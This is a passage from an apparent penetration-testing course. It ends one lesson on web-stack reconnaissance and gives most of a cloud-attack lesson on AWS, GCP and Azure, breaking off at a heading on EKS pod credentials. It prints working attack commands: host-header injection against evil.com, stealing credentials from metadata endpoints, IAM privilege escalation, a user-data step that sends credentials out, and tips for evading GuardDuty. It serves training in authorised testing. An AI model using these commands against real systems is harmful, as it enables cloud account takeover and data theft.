The nginx config forwards Host to the Next.js backend unchanged. getServerSideProps builds absolute URLs using req.headers.host.
curl -s -H "Host: evil.com" $TARGET/reset-password?email=alice@example.com | grep -o 'https://[^"]*reset'
# https://evil.com/reset?token=abc...

A poisoned reset link is now baked into the outgoing email. Combine with the ISR cache in front (if enabled) for wider blast radius.
16.6 Deliverable

Write up all four findings (fingerprint, IDOR, endpoint enumeration, host-header injection) in the format from Module-03/Lesson-05-Report-Writing.md. Reference the exact commands you used.
17. Exercises
17.1 Guided Exercises

Exercise 1 — Rendering Model Identification

Given three targets:
https://blog.example.com/
https://app.example.com/
https://shop.example.com/

Use curl, whatweb and dev-tools to identify whether each is MPA, SPA, SSR, SSG or ISR. Justify each answer with two pieces of evidence from the HTTP response.

Exercise 2 — GraphQL Introspection and Cost

Point graphw00f at http://lab-graphql.pentest.local:4000/graphql. Confirm the server. Run the introspection query, save the SDL to schema.graphql, and identify the three most expensive-looking resolvers. Craft a 500-alias query against the most expensive one and measure response time with curl -w.

Exercise 3 — Reverse Proxy Fingerprint

Run smuggler.py against http://lab-smuggle.pentest.local:8080/. Record which smuggling variants (CL.TE, TE.CL, TE.TE) the target is vulnerable to, and paste the raw payload that succeeded.
17.2 Independent Exercises

Exercise 4 — Full Stack Fingerprint Report

Choose any bug-bounty program on HackerOne that is in-scope for you. Produce a one-page reconnaissance report covering: framework, render mode, API style, CDN, reverse proxy, session model, CORS posture and CSP grade. Do not send a single payload — reconnaissance only.

Exercise 5 — Origin Discovery

Pick a Cloudflare-fronted target with your written permission. Using crt.sh, Shodan favicon hashing and any historical DNS source, attempt to recover the true origin IP. Document each step and the reasoning behind it.

Exercise 6 — Cache Poisoning PoC

Set up lab-cache.pentest.local from the course repo and demonstrate a cache-poisoning attack via an unkeyed X-Forwarded-Host header. Show that a second visitor with no attack payload receives the poisoned response. Screenshot both requests.
18. Summary and Next-Lesson Pointer

This lesson replaced the black-box "run the scanner and hope" approach with a systematic architectural read of a modern web application. You now know how to look at HTTP responses, JavaScript bundles and cache headers and reconstruct the entire stack in your head — from Cloudflare edge, through the nginx reverse proxy, into the Next.js SSR node, out to the GraphQL endpoint, and down to the Redis session store.

The five render models (MPA, SPA, SSR, SSG, ISR) each invite a different bug class. REST and GraphQL each require different tooling and different first payloads. WebSockets and gRPC-Web are their own worlds. Reverse proxies enable smuggling; CDNs enable cache poisoning; edge functions can be bypassed if the origin leaks; and CORS and CSP misconfigurations are found by reading two headers, not by fuzzing.

The next lesson — Lesson 08 — Container Escape Techniques and Kubernetes Attack Surface — turns from the application layer to the runtime that hosts it. You will take the same target from Section 16, break out of its Docker container, pivot into the Kubernetes control plane, and demonstrate why architectural understanding at the container layer completes the picture.



























Lesson 09 — Cloud Architecture Fundamentals

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Every modern breach ends in a cloud console. The perimeter you were taught to attack a decade ago — a hardened bastion host in a colocated rack — has been replaced by an IAM policy document, a VPC route table, and a metadata endpoint at 169.254.169.254. When you compromise a modern application, the loot is no longer local /etc/shadow hashes; it is a set of short-lived STS credentials, a service-account JSON key, or a managed identity token that unlocks the entire tenant.

This lesson maps the terrain. It walks the three big providers side by side, installs the CLIs on Kali 2026, drills into IAM on each provider, covers the network primitives (VPC, VNet, subnets, endpoints), the metadata services that turn any SSRF into a full compromise, storage misconfigurations that leak petabytes, serverless attack surface, managed databases, container orchestrators, secrets stores, and the logging you leave behind while you enumerate. It closes with an end-to-end scenario — an unauthenticated SSRF that ends with plaintext database credentials pulled from an S3 backup — and a set of exercises that force you to reproduce each stage.

By the end you will read a cloud architecture diagram the way you now read an Nmap scan, and you will know exactly which command from Kali maps to which cloud primitive.
1. The Three Big Providers Side by Side

Amazon Web Services (AWS), Google Cloud Platform (GCP), and Microsoft Azure control roughly two thirds of the global cloud market between them. Each names the same fundamental primitive differently, which is a leading source of confusion when you land on a compromised host and cannot tell whether the credentials you found grant you EC2 access, Compute Engine access, or an Azure Virtual Machine.
1.1 The Equivalence Table
Concept	AWS	GCP	Azure
Virtual machine	EC2 instance	Compute Engine VM	Virtual Machine
Object storage	S3 bucket	Cloud Storage bucket (GCS)	Blob Storage container
Block storage	EBS volume	Persistent Disk	Managed Disk
Identity for workloads	IAM Role	Service Account	Managed Identity
Identity for humans	IAM User	Google Account / Workspace	Entra ID (Azure AD) user
Virtual network	VPC	VPC	VNet
Subnet	Subnet	Subnet	Subnet
Function as a Service	Lambda	Cloud Functions	Azure Functions
Container orchestration	EKS	GKE	AKS
Managed containers	ECS / Fargate	Cloud Run	ACI / Container Apps
Managed relational DB	RDS / Aurora	Cloud SQL	Azure SQL
Managed NoSQL	DynamoDB	Firestore / Bigtable	Cosmos DB
Secrets store	Secrets Manager	Secret Manager	Key Vault
Configuration store	Parameter Store	Runtime Config	App Configuration
Audit log	CloudTrail	Cloud Audit Logs	Activity Log
Network flow log	VPC Flow Logs	VPC Flow Logs	NSG Flow Logs
Anomaly detection	GuardDuty	Security Command Center	Microsoft Defender for Cloud
Metadata endpoint	169.254.169.254 (IMDS)	metadata.google.internal	169.254.169.254 (IMDS)
Assume role primitive	sts:AssumeRole	iam.serviceAccounts.getAccessToken	Get-AzAccessToken on MI
1.2 What the Equivalence Hides

The primitives look one-to-one on paper. In practice, the trust models differ enough to matter to an attacker:

    AWS IAM is deny-by-default and additive; roles are assumed by principals through a trust policy that names who may assume them. The chain is explicit.
    GCP IAM is bound to resources (org, folder, project, resource) and inherits down the hierarchy. A principal that is roles/owner at the folder level owns every project the folder ever contains, forever, until unbound.
    Azure IAM (RBAC) is scope-based like GCP but layered on top of Entra ID (formerly Azure AD), which handles the identity itself. Two directories, one plane.

Understanding these three trust models is the difference between a valid privesc report and a false positive.
2. Installing and Configuring the CLIs on Kali 2026

Kali 2026 ships with Python 3.12 and current package repositories. The three provider CLIs are all installable through the distribution or through their vendor installers. In practice, you keep all three configured on your engagement box because you rarely know in advance which provider a client uses, and multi-cloud environments are the norm.
2.1 AWS CLI v2
# Install from the distribution repo:
sudo apt update
sudo apt install -y awscli
aws --version
# aws-cli/2.17.x Python/3.12.x Linux/6.10-kali

# Or install directly from Amazon (always latest):
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o awscliv2.zip
unzip awscliv2.zip
sudo ./aws/install --update

# Configure a named profile — never use the default profile on a real engagement:
aws configure --profile client-prod
# AWS Access Key ID:     AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Default region name:   us-east-1
# Default output format: json

The credentials land in ~/.aws/credentials:
[client-prod]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

And the config in ~/.aws/config:
[profile client-prod]
region = us-east-1
output = json

Invoke a profile with --profile client-prod on every command, or export AWS_PROFILE=client-prod for the shell.
2.2 Google Cloud SDK
# Add the Cloud SDK apt repository:
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | \
  sudo tee /etc/apt/sources.list.d/google-cloud-sdk.list

curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | \
  sudo gpg --dearmor -o /usr/share/keyrings/cloud.google.gpg

sudo apt update
sudo apt install -y google-cloud-sdk

gcloud version
# Google Cloud SDK 490.x
# alpha 2026.x
# beta 2026.x

# Authenticate with a service account key (typical for a pentester who found a JSON key):
gcloud auth activate-service-account --key-file=/loot/sa-key.json

# Or set an authorization named configuration:
gcloud config configurations create client-prod
gcloud config set account pentester@client.iam.gserviceaccount.com
gcloud config set project client-prod-01
gcloud config configurations activate client-prod
2.3 Azure CLI
# Install via Microsoft's install script:
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az version
# {
#   "azure-cli": "2.66.x",
#   "azure-cli-core": "2.66.x"
# }

# Interactive device-code login (opens a browser):
az login --use-device-code

# Or service principal login when you have a client secret:
az login --service-principal \
  -u 00000000-0000-0000-0000-000000000000 \
  -p 'sp-client-secret' \
  --tenant 11111111-1111-1111-1111-111111111111

# Switch between subscriptions:
az account list -o table
az account set --subscription "Client Production"
2.4 Keep Profiles Isolated

Never mix a client's credentials with your personal cloud accounts. A single stray command against the wrong profile can bill the client thousands or trigger their detection. Use shell aliases:
alias awsp='AWS_PROFILE=client-prod aws'
alias gcp-p='CLOUDSDK_ACTIVE_CONFIG_NAME=client-prod gcloud'
alias az-p='az --subscription "Client Production"'
3. AWS IAM Deep Dive

IAM is the entire security model of AWS. Every API call goes through it, every resource is protected by it, and every privilege escalation in AWS is an IAM policy misconfiguration.
3.1 The Four Principals
Principal	Description	Credential
IAM User	Long-lived human identity within an account	Access key + secret
IAM Group	A container for users; policies attach to the group	N/A — inherits through membership
IAM Role	Assumable identity for workloads or cross-account	Temporary STS credentials
Federated user	Identity from an external IdP (SAML, OIDC)	Temporary STS credentials
3.2 Inline vs Managed Policies

    Inline policies are embedded directly in a single user, group, or role. They are invisible unless you explicitly list them per principal.
    Managed policies are standalone objects and can be attached to many principals. AWS-managed policies (arn:aws:iam::aws:policy/...) are curated by AWS; customer-managed policies live under the account's own ARN.

When you audit an account, always enumerate both. Attackers hide privileges in inline policies because a single-line addition to an inline policy escapes most default checks.
3.3 Trust Policy vs Permissions Policy

A role has two policy documents:

    The trust policy answers who can assume this role. It appears on the role itself and uses the sts:AssumeRole action in a policy where the Principal element names accounts, users, roles, or services.
    The permissions policy answers what the role can do once assumed. It looks like any other IAM policy.

A common pentester finding is a trust policy that names "Principal": {"AWS": "*"} — anyone in any AWS account can assume the role. Combined with a permissions policy that grants s3:*, that is a full data breach exposed to the public internet.
3.4 Condition Keys

Condition keys narrow when a policy applies. The important ones for a red teamer:

    aws:SourceIp — restricts by source IP. Trivially bypassed if you land in the target's VPC.
    aws:MultiFactorAuthPresent — requires MFA on the calling session.
    aws:PrincipalOrgID — restricts to principals in a specific AWS Organization.
    aws:SourceVpce — restricts to calls arriving through a specific VPC endpoint.

Absence of these on a sensitive action is itself the finding.
3.5 First Commands After a Compromise

The moment you land credentials, you run:
# Who am I?
aws sts get-caller-identity --profile loot
# {
#   "UserId": "AIDAEXAMPLEUSERID",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/backup-service"
# }

# What can I do? — try the account-authoritative APIs:
aws iam list-account-aliases --profile loot
aws iam list-users --profile loot
aws iam list-roles --profile loot
aws iam list-attached-user-policies --user-name backup-service --profile loot
aws iam list-user-policies --user-name backup-service --profile loot

# Enumerate policies attached to your own identity:
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/backup-service \
  --action-names s3:GetObject ec2:RunInstances iam:PassRole \
  --profile loot

The simulate-principal-policy call is the cleanest way to check individual permissions without generating a AccessDenied on the real target action.
4. IAM Privilege Escalation Paths

Rhino Security Labs catalogued the classic AWS privesc paths years ago; they still work because they exploit compositions of legitimate permissions rather than software bugs.
4.1 iam:PassRole + ec2:RunInstances

If your principal can pass any role to a new EC2 instance and can launch an instance, you can attach an instance profile that grants full administrative access, then read the credentials from IMDS:
# Enumerate roles that can be passed:
aws iam list-instance-profiles --profile loot | jq '.InstanceProfiles[].Roles[].RoleName'

# Launch an instance with the target role attached:
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data file:///tmp/exfil.sh \
  --profile loot

The exfil.sh user-data script curls IMDS and sends the credentials to a listener you control.
4.2 iam:CreateAccessKey on a Privileged User

If you can create access keys on any user, and any user in the account has more privilege than you, you promote yourself:
# Find users with admin-adjacent policies:
aws iam list-attached-user-policies --user-name breakglass-admin --profile loot

# Mint a new access key for that user:
aws iam create-access-key --user-name breakglass-admin --profile loot
# {
#   "AccessKey": {
#     "AccessKeyId": "AKIA...NEW",
#     "SecretAccessKey": "wJal...NEW",
#     ...
#   }
# }

# Configure and use it:
aws configure --profile pivoted

Users are limited to two active access keys. If the target already has two, this call fails — plan a rotation, or use a different vector.
4.3 sts:AssumeRole Chains

Cross-account or cross-role chains are the least-monitored path. If you can assume role A, and role A can assume role B in another account, and role B is powerful, you have a chain that most detection rules miss because each link looks legitimate:
# Step 1 — assume the first role:
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/deploy-role \
  --role-session-name pivot \
  --profile loot

# Export the returned credentials:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Step 2 — hop to the second role in a peer account:
aws sts assume-role \
  --role-arn arn:aws:iam::999888777666:role/prod-admin \
  --role-session-name pivot2

Full escalation catalog to consult:
Vector	Required Permission
iam:PassRole + ec2:RunInstances	Both
iam:CreateAccessKey	On any privileged user
iam:CreateLoginProfile	On any privileged user without console access
iam:UpdateLoginProfile	Reset a console password on a privileged user
iam:AttachUserPolicy	Attach admin to yourself
iam:PutUserPolicy	Inline admin on yourself
iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion	Rewrite a customer-managed policy
lambda:UpdateFunctionCode + attached role	Overwrite a function that runs as admin
codebuild:UpdateProject + attached role	Same, in CodeBuild
5. Enumeration from Kali — enumerate-iam and pacu

Two tools dominate AWS enumeration from the attacker side: enumerate-iam for permission discovery on a single credential, and pacu for a full modular framework.
5.1 enumerate-iam
# Install:
sudo apt install -y python3-pip
pip3 install --break-system-packages enumerate-iam

# Run against a captured key pair:
enumerate-iam \
  --access-key AKIAIOSFODNN7EXAMPLE \
  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# -- Confirmed permissions for: --
# s3.list_buckets
# ec2.describe_instances
# iam.list_users
# lambda.list_functions

The tool sends benign read-only calls for hundreds of API actions and records which ones succeed. It generates a moderate CloudTrail footprint — every attempted call is logged, most as AccessDenied.
5.2 Pacu

Pacu (by Rhino Security Labs) is the metasploit of AWS.
sudo apt install -y pacu
pacu
# Pacu (client-prod:no-key-alias) >

# Create a new session:
Pacu > new_session client-prod

# Import credentials from an aws profile:
Pacu > set_keys
Key alias [imported-key]: loot-key
Access key ID: AKIAIOSFODNN7EXAMPLE
Secret access key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Run reconnaissance modules:
Pacu > run iam__enum_permissions
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run ec2__enum
Pacu > run s3__bucket_finder

# Search for privesc paths:
Pacu > run iam__privesc_scan

# Attempt exploitation of a discovered path:
Pacu > run iam__privesc_scan --offline

Every Pacu action is logged in the session's SQLite database under ~/.local/share/pacu/. Pull it off the engagement box at the end for reporting.
5.3 Detection Impact

Both tools trigger AccessDenied bursts in CloudTrail. If GuardDuty is enabled, the following findings will fire:

    Recon:IAMUser/UserPermissions — many failed IAM permission checks.
    Recon:IAMUser/MaliciousIPCaller — enumeration from a Tor exit or known scanner IP.
    UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration — credentials known to belong to an EC2 role used from outside AWS.

Run enumeration from an EC2 instance inside the target account if you can. It sidesteps the last finding entirely.
6. GCP IAM

GCP IAM is resource-hierarchical. Bindings apply at Organization, Folder, Project, or individual resource level, and inherit downward.
6.1 The Hierarchy
Organization (client.io)
   |
   +-- Folder: Engineering
   |     |
   |     +-- Project: eng-dev
   |     +-- Project: eng-prod
   |
   +-- Folder: Data
         |
         +-- Project: analytics-prod

A roles/owner binding at the Organization node is total: it owns every folder, every project, every resource, forever. Attackers hunt for the highest-scope binding they can achieve because everything below inherits.
6.2 Primitive, Predefined, and Custom Roles
Role Type	Example	Notes
Primitive (legacy)	roles/owner, roles/editor, roles/viewer	Grossly broad; project-wide.
Predefined	roles/compute.admin, roles/storage.objectViewer	Curated by Google; scoped to a service.
Custom	projects/eng-prod/roles/customBackupReader	Defined by the customer with explicit permissions.

roles/editor is deceptively named — it grants write access to almost every resource in a project and is a common privesc target.
6.3 Service Accounts and Key Files

A service account is an identity for workloads. It has its own email address of the form sa-name@project-id.iam.gserviceaccount.com, its own IAM bindings, and can hold up to ten user-managed keys. A service-account JSON key file — leaked into a Git repo, embedded in a mobile app, or dropped on a bastion host — is a long-lived, unrotated credential.
# Enumerate service accounts in a project:
gcloud iam service-accounts list --project client-prod-01

# Enumerate IAM bindings on a project:
gcloud projects get-iam-policy client-prod-01

# Enumerate bindings on a folder:
gcloud resource-manager folders get-iam-policy 987654321000

# Enumerate bindings on the org:
gcloud organizations get-iam-policy 123456789000

# Impersonate a service account you have bindings on:
gcloud auth print-access-token \
  --impersonate-service-account=admin-sa@client-prod-01.iam.gserviceaccount.com

The iam.serviceAccounts.getAccessToken permission is GCP's equivalent of sts:AssumeRole. If you can call it against a more privileged SA, you have that SA's power.
6.4 Common GCP Privesc Vectors
Permission	Escalation
iam.serviceAccounts.getAccessToken	Mint tokens for a more privileged SA.
iam.serviceAccounts.actAs + compute.instances.create	Attach a privileged SA to a new VM.
iam.serviceAccountKeys.create	Mint a long-lived key for a privileged SA.
iam.roles.update	Add permissions to a custom role you have.
deploymentmanager.deployments.create	Deploy using the Deployment Manager SA, which is often roles/editor.
cloudfunctions.functions.update + attached SA	Overwrite a function running as a privileged SA.
7. Azure IAM

Azure splits identity (Entra ID, formerly Azure AD) from authorization (RBAC on Azure resources).
7.1 Scope Hierarchy
Management Group (root)
   |
   +-- Subscription: Client Production
         |
         +-- Resource Group: rg-web-prod
         |     |
         |     +-- Storage Account: cldstoreprod01
         |     +-- Virtual Machine: web-01
         |
         +-- Resource Group: rg-data-prod

Role assignments at any level inherit down. Owner on a subscription owns every resource group and every resource forever.
7.2 Built-in vs Custom Roles

    Built-in: Owner, Contributor, Reader, User Access Administrator, plus service-specific roles like Storage Blob Data Contributor.
    Custom: JSON definition with actions, notActions, dataActions, and assignableScopes.

Contributor is powerful — it can create, update, delete anything, but crucially it cannot modify RBAC. User Access Administrator is the role that grants RBAC power. Contributor + User Access Administrator = de facto Owner.
7.3 Managed Identities

A managed identity is Azure's IAM-role-for-workloads primitive. Two flavors:

    System-assigned — bound to the lifetime of a resource (VM, Function App, Container App). Deleted when the resource is.
    User-assigned — a standalone identity that can be attached to many resources.

Both are represented in Entra ID as service principals and receive tokens from IMDS.
7.4 Privileged Identity Management (PIM)

PIM makes roles eligible rather than always active. An admin activates the role for a bounded time (typically 1-8 hours), often with MFA and an approval workflow. On a mature engagement you will see almost every high-privilege role marked eligible only; look for standing role assignments as a finding.
7.5 Enumeration from Kali
# What identity am I?
az account show

# List every subscription I can see:
az account list -o table

# Dump the role assignments on the current subscription:
az role assignment list --all -o table

# Dump role assignments for a specific principal:
az role assignment list --assignee myprincipal@client.onmicrosoft.com --all

# List custom role definitions:
az role definition list --custom-role-only true -o table

# List managed identities:
az identity list -o table

# For deeper enumeration, use ROADrecon or AzureHound (both in the pentest-cloud skill):
sudo apt install -y bloodhound
# AzureHound collects both AAD and Azure RBAC and feeds BloodHound.
8. VPC / VNet Fundamentals

Cloud networks are software-defined. A VPC (AWS/GCP) or VNet (Azure) is a private IP range you carve into subnets, route with a route table, and connect to the outside through gateways.
8.1 The Core Objects
Object	Purpose	Pentester Interest
VPC / VNet	The private IP space	Defines the blast radius of an internal pivot.
Subnet	A slice of the VPC bound to an availability zone	Public vs private classification matters.
Route Table	Sends traffic to a target (IGW, NAT, peering, VPC endpoint)	Modifying it can redirect traffic through your instance.
Internet Gateway (IGW)	Egress and ingress to the public internet	Only public subnets have a default route to it.
NAT Gateway	Outbound-only internet from private subnets	Private hosts still egress; useful for beacon channels.
Security Group	Stateful L4 firewall bound to an ENI	Egress 0.0.0.0/0 is common and permissive.
NACL	Stateless subnet-level ACL	Rarely used; overlooked when set.
VPC Peering	Direct route between two VPCs	Lateral movement path between accounts.
VPC Endpoint / PrivateLink	Private route to an AWS service	Bypasses aws:SourceIp conditions.
Transit Gateway	Hub-and-spoke connectivity	One compromise, many VPCs.
8.2 Pivot Points

Once you land a shell in a VPC, the classic pivots are:
# What subnet am I on?
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
# 06:1c:...

curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/06:1c:.../subnet-id
# subnet-0abc123def456

# What is the CIDR of this VPC?
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/06:1c:.../vpc-ipv4-cidr-block
# 10.0.0.0/16

# Scan the VPC — use masscan for speed:
sudo masscan 10.0.0.0/16 -p 22,80,443,3389,5432,3306 --rate 5000

VPC endpoints deserve their own attention. A VPC endpoint for S3 or DynamoDB gives resources in the VPC a private path to the service. Bucket policies often use the aws:SourceVpce condition — if you can pivot to a host inside the target's VPC, buckets that appear locked down from the internet become fully readable.
9. Metadata Services

Every cloud VM exposes a metadata endpoint that the guest OS can query for instance details and, critically, for credentials tied to the instance's role or managed identity. Reaching this endpoint from an SSRF is the single most common cloud escalation on the internet.
9.1 AWS — IMDSv1 vs IMDSv2

IMDSv1 answers any HTTP GET to http://169.254.169.254/latest/meta-data/.... There is no header requirement, no PUT-based session token; a naive SSRF that fetches a URL directly returns credentials.
# IMDSv1 — one GET:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# my-instance-role

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-instance-role
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }

IMDSv2 requires a PUT to obtain a short-lived session token, sent in X-aws-ec2-metadata-token on subsequent GETs. It defeats most SSRF because the affected HTTP client typically cannot issue a PUT or set arbitrary headers:
# IMDSv2 — PUT to get the token:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

IMDSv1 is still allowed on many production accounts because forcing IMDSv2 breaks legacy SDKs. Enumerate HttpTokens on instances during an assessment — if any instance is optional, IMDSv1 works there.
9.2 GCP — Metadata-Flavor Header

Google's metadata service is at http://metadata.google.internal/ (or 169.254.169.254) and requires the header Metadata-Flavor: Google. Historically it also honored X-Google-Metadata-Request: True; modern versions require Metadata-Flavor.
# Access token for the attached service account:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}

# Full identity token (a signed JWT):
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com"

Any SSRF that lets you inject an arbitrary header defeats this control.
9.3 Azure — Metadata: true

Azure IMDS is at http://169.254.169.254/metadata/ and requires Metadata: true and a specific API version.
# Token for the system-assigned managed identity:
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

Same story: any header-controlling SSRF is game over.
9.4 Defensive Takeaway You Should Report

When you find an IMDSv1-enabled instance and demonstrate SSRF, report both the SSRF and the IMDS configuration. Enforcing IMDSv2 is a one-command fix and every finding you file should include it as a remediation:
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-endpoint enabled
10. Object Storage Misconfiguration

Public object-storage buckets remain the single largest source of cloud data breaches. Every provider offers a variant of the same knob, and all three ship secure by default now — but historical buckets and misconfigurations by application teams are ubiquitous.
10.1 AWS S3

An S3 bucket is public if any of the following are true:

    The bucket ACL grants AllUsers or AuthenticatedUsers.
    The bucket policy grants Principal: "*" on read actions.
    Public access is not blocked at the account or bucket level (Block Public Access).

Enumerate with s3scanner:
sudo apt install -y s3scanner
s3scanner scan --bucket-file /wordlists/company-buckets.txt \
  --dump --dump-dir /loot/s3

# Or scan buckets you already know:
s3scanner scan --bucket company-backups
# company-backups | bucket_exists | AuthUsers: [] | AllUsers: [READ] | ...

For AWS accounts you have credentials for, use the CLI directly:
aws s3api list-buckets --profile loot
aws s3api get-bucket-acl --bucket company-backups --profile loot
aws s3api get-bucket-policy --bucket company-backups --profile loot
aws s3api get-public-access-block --bucket company-backups --profile loot
aws s3 ls s3://company-backups/ --recursive --profile loot
10.2 GCP Cloud Storage

GCS supports two access-control modes:

    Fine-grained (legacy) — per-object ACLs, plus IAM.
    Uniform bucket-level access — IAM only; per-object ACLs disabled.

The default is uniform. Public buckets are those with an IAM binding of allUsers or allAuthenticatedUsers at roles/storage.objectViewer or higher.
# Enumerate a known bucket:
gsutil ls -L gs://company-backups
# Or scan a target org with gcp-scanner:
pip3 install --break-system-packages gcp-scanner
gcp-scanner --organization 123456789000 --output /loot/gcp-scan

gcp-scanner (by Google's own security team, published on GitHub) enumerates every public resource visible under an org — buckets, functions, images, IAM policies, and more.
10.3 Azure Blob Storage

Azure blob containers have three public-access levels: off, blob (public read to individual blobs if you know the name), and container (public listing).
# Enumerate public blob containers by DNS-guessing:
sudo apt install -y powershell
pwsh
# From MicroBurst:
Import-Module ./MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base companyname
# companystoragebackups.blob.core.windows.net -> Public container: 'backups'

MicroBurst (NetSPI) is the classic Azure enumeration toolkit. It DNS-guesses storage accounts against <name>.blob.core.windows.net, <name>.file.core.windows.net, and so on.
10.4 Reading the Right Buckets First

Once you have a list of buckets, prioritize by name:

    backup, backups, db-backup, mysql-dump, snapshot
    terraform, tfstate, state, infra, cicd
    secrets, creds, dev-envs, env, configs
    logs, access-logs, cloudtrail, waf

Terraform state files (terraform.tfstate) are especially lucrative — they contain every secret Terraform managed, including database passwords and API keys, in plaintext.
11. Serverless Architecture

Serverless platforms — AWS Lambda, GCP Cloud Functions, Azure Functions — abstract the host away, but they do not abstract the attack surface. Understanding what remains is the entire point of this section.
11.1 What You Attack
Surface	Description
Deployment package	The zip/container image the platform runs. Dependency-confusion in requirements.txt or package.json compromises every invocation.
Environment variables	Convenient place to stash DB URLs, API keys, tokens. Any code injection reads them via os.environ.
Execution role / SA	The function's identity for calls it makes to other cloud services. Often over-privileged.
Triggers	HTTP endpoints, event sources (S3 events, SQS, Pub/Sub). Attacker-controlled input flows through them.
Cold-start persistence	Files written to /tmp persist across invocations on the same container instance — useful for both offense and defense.
11.2 Enumerate Lambda from Kali
# List functions:
aws lambda list-functions --profile loot | jq '.Functions[].FunctionName'

# Get the code and environment for a target function:
aws lambda get-function --function-name public-api-handler --profile loot
# {
#   "Configuration": { "Environment": { "Variables": { "DB_URL": "postgres://...", ... } } },
#   "Code": { "Location": "https://prod-04-2014-tasks.s3...", ... }
# }

# Download and unzip the code:
curl -o /tmp/fn.zip "$(aws lambda get-function --function-name public-api-handler --query 'Code.Location' --output text --profile loot)"
unzip /tmp/fn.zip -d /tmp/fn

# Grep for the interesting bits:
grep -rEi 'password|secret|token|key' /tmp/fn

The same shape works for GCP and Azure — gcloud functions describe and az functionapp show respectively.
11.3 Execution Role Scope Creep

Developers grant roles/editor, Contributor, or AmazonS3FullAccess to a function "temporarily" for a launch, and it stays for years. Every code-execution vulnerability in the function inherits that privilege. Audit function roles as aggressively as you audit user roles.
12. Managed Databases

Managed databases move operational burden to the provider, but the attack surface is still there.
12.1 The Usual Suspects
Service	Common Misconfiguration
RDS / Aurora	Snapshot shared with all accounts; public accessibility on.
Cloud SQL	Instance authorized network 0.0.0.0/0.
Cosmos DB	Firewall Allow access from all networks; primary key in code.
DynamoDB	IAM policy too broad; PITR backups readable.
12.2 Snapshot Sharing Misconfiguration

RDS snapshots can be marked public. Anyone in any AWS account can then restore your database into their own account and query it at leisure.
# From your own account, hunt for publicly shared snapshots:
aws rds describe-db-snapshots \
  --snapshot-type public \
  --include-public \
  --query 'DBSnapshots[?contains(DBSnapshotArn, `target-account-id`)]'

# If the target is your own client, this call also enumerates their leaks:
aws rds describe-db-snapshots \
  --snapshot-type public \
  --include-public --profile loot
12.3 Publicly Reachable Instances

Any managed database with a public endpoint and an over-permissive security group is a straightforward exposure. Nmap the exposed CIDR:
nmap -Pn -p 3306,5432,1433,27017,6379 -sS -T4 <db-endpoint-cidr>

Combine with credentials you found in a leaked .env file, in a Lambda environment, or in an S3 backup.
13. Container Services

Managed container platforms are cloud-native at every layer, and their attack surface is a superset of Kubernetes plus the underlying cloud identity.
13.1 The Landscape
Service	Provider	Notes
ECS	AWS	Task roles per task; tasks reach IMDS through a task metadata endpoint.
EKS	AWS	Full Kubernetes; nodes have IAM roles, pods can have IRSA or Pod Identity.
Fargate	AWS	Serverless container runtime under ECS/EKS.
GKE	GCP	Kubernetes; nodes have node SA; Workload Identity binds pods to SA.
Cloud Run	GCP	Serverless containers; per-service SA.
AKS	Azure	Kubernetes; kubelet identity, pod-managed identity or Workload Identity.
ACI	Azure	Serverless containers; per-container-group MI.
13.2 Task Role Stealing on ECS via IMDS SSRF

ECS tasks fetch their credentials from a task-metadata endpoint, not IMDS directly. The endpoint URL is exposed to the container in the environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:
# Inside the container:
env | grep AWS
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/8bd...

# Fetch task credentials:
curl "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
# {
#   "AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...",
#   "Expiration":"2026-...","RoleArn":"arn:aws:iam::...:role/ecs-task-role"
# }

An SSRF in a containerized web application that reaches 169.254.170.2 returns credentials for the task role. The same trick applies to Fargate.
13.3 EKS Pod Credentials

